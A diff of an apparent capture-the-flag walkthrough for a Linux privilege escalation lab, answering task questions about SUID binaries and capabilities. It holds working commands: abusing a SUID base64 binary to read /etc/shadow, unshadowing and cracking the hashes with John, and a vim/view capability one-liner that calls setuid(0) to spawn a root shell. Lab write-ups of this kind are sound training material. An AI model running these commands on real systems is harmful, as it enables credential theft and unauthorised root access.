@@ -56,7 +56,7 @@ Question 1: Which user shares the name of a great comic book writer?
 {Hint: nano /etc/passwd}
 
 Question 2: What is the password of user2?
-{First, use [find / -type f -perm -04000 -ls 2>/dev/null] to find files that have SUID or SGID set.
+{First, use "find / -type f -perm -04000 -ls 2>/dev/null" to find files that have SUID or SGID set.
 Compare this list against gtfobins with the SUID filter set.
 The only viable option appears to be base64. In order to get user2's password, we must abuse the binary to 
 be able to read the /etc/shadow file.
@@ -66,8 +66,23 @@ base64 "/etc/shadow" | base64 --decode
 Copy the output to a txt file, along with the contents of /etc/passwd in another. Next, we must unshadow it.
 "unshadow [passwdfile.txt] [shadowfile.txt] > unshadowed.txt"
 Now, run John against it
-john unshadowed.txt
+"john unshadowed.txt"
 
 Question 3: What is the content of the flag3.txt file?
 {LFILE=flag3.txt
 base64 "flag3.txt" | base64 --decode}
+
+
+
+Task 8 {Privilege Escalation: Capabilities}
+
+Question 1: How many binaries have set capabilities?
+{Hint: getcap -r / 2>/dev/null}
+
+Question 2: What other binary can be used through its capabilities?
+{Hint: Check gtfobins on which one can be abused}
+
+Question 3: What is the content of the flag4.txt file?
+{Hint: /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'}
+
+
